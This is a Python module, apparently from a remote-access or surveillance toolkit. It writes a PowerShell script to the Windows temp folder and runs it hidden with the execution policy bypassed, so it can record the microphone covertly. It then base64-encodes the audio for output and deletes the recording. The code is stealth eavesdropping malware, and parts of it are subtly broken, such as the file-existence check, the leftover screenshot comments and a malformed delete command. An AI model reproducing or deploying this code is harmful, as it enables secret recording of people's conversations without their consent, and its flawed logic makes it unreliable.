import os
import os.path
import subprocess
from base64 import b64encode





#------------------------------
#Variable for modules to run
FOLDER_NAME = "MICROPHONE4567"
FOLDER_PATH = os.path.expandvars(os.getenv("temp") + f"\\{FOLDER_NAME}")
MICROPHONE_RECORD_SCRIPT_PATH = os.path.expandvars(FOLDER_PATH + f"\\record-audio.ps1")
OUTPUT_FILE_RECORDING_PATH = os.path.expandvars(FOLDER_PATH+"\\recording.wav")
#-------------------------------


MICROPHONE_RECORD_SCRIPT = """
# record-audio.ps1

# Set the duration of the recording in seconds
param (
    [int]$recordDuration = 10,
    [string]$outputFilePath = "C:\path\to\output\recording.wav"
)

# VBScript content to record audio silently
$vbScript = @"
Set objVoice = CreateObject("SAPI.SpVoice")
Set objFileStream = CreateObject("SAPI.SpFileStream")
Set objAudioFormat = CreateObject("SAPI.SpAudioFormat")

objAudioFormat.Type = 22 ' 22 = SAFT22kHz16BitMono

objFileStream.Format = objAudioFormat
objFileStream.Open "$outputFilePath", 3, True

Set objRecognizer = CreateObject("SAPI.SpInProcRecognizer")
Set objContext = objRecognizer.CreateRecoContext
Set objGrammar = objContext.CreateGrammar

objGrammar.DictationSetState(1)

Set objStream = objRecognizer.AudioInputStream

WScript.Sleep $($recordDuration * 1000)

objFileStream.Close
"@

# Save the VBScript to a temporary file
$tempVbsFile = [System.IO.Path]::GetTempFileName() + ".vbs"
Set-Content -Path $tempVbsFile -Value $vbScript

# Execute the VBScript
Start-Process -FilePath "cscript.exe" -ArgumentList "//NoLogo", $tempVbsFile -NoNewWindow -Wait

# Remove the temporary VBScript file
Remove-Item -Path $tempVbsFile

Write-Output "Recording saved to $outputFilePath"
"""





def run_command(command):
    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    return out + err


def microphone_recorder(record_duration,outputfilepath):
    #Checks if folder exists or not if not exists creates one
    if not os.path.exists(FOLDER_PATH):
        os.makedirs(FOLDER_PATH)
    #Checks if script is present or not if not present creates the script
    if not os.path.exists(FOLDER_PATH):
        f = open(MICROPHONE_RECORD_SCRIPT_PATH, 'w')
        f.write(MICROPHONE_RECORD_SCRIPT)
        f.close()
    #Get the screenshot
    command = f"powershell -ep Bypass -windowstyle hidden {MICROPHONE_RECORD_SCRIPT_PATH} -recordDuration {str(record_duration)} -outputFilePath {outputfilepath}"
    run_command(command)
    if os.path.exists(os.path.expandvars(outputfilepath)):
        return True
    else:
        return False

def run(options):
    record_time = int(options["record_time"])
    if microphone_recorder(record_time,OUTPUT_FILE_RECORDING_PATH):
        with open(OUTPUT_FILE_RECORDING_PATH,'rb') as f:
            data = f.read()
            f.close()
        raw_data = b64encode(data)

        print(raw_data)
        run_command(f"rm -rf  + {OUTPUT_FILE_RECORDING_PATH}")
    else:
        print("No Screenshot file found")
    